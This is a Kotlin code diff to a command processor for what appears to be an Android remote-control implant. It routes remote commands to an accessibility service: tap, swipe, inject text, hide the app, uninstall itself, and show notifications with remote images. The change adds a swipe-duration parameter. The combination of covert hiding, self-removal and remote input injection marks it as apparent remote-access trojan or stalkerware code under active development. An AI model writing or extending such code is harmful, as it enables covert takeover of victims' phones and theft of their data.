@@ -28,7 +28,10 @@ object CommandProcessor {
         val svc = MyAccessibilityService.instance ?: return
         when (cmd.type) {
             "tap" -> svc.tap(cmd.x ?: 0, cmd.y ?: 0)
-            "swipe" -> svc.swipe(cmd.sx ?: 0, cmd.sy ?: 0, cmd.ex ?: 0, cmd.ey ?: 0)
+            "swipe" -> {
+                val duration = cmd.duration ?: 300L
+                svc.swipe(cmd.sx ?: 0, cmd.sy ?: 0, cmd.ex ?: 0, cmd.ey ?: 0, duration)
+            }
             "type" -> svc.injectText(cmd.text ?: "")
             "hide_activity" -> svc.hideApp()
             "uninstall" -> svc.uninstallSelf()
@@ -68,6 +71,7 @@ object CommandProcessor {
         val text: String? = null,
         val title: String? = null,
         val iconUrl: String? = null,
-        val bigPictureUrl: String? = null
+        val bigPictureUrl: String? = null,
+        val duration: Long? = null  // <-- ADDED THIS
     )
 }
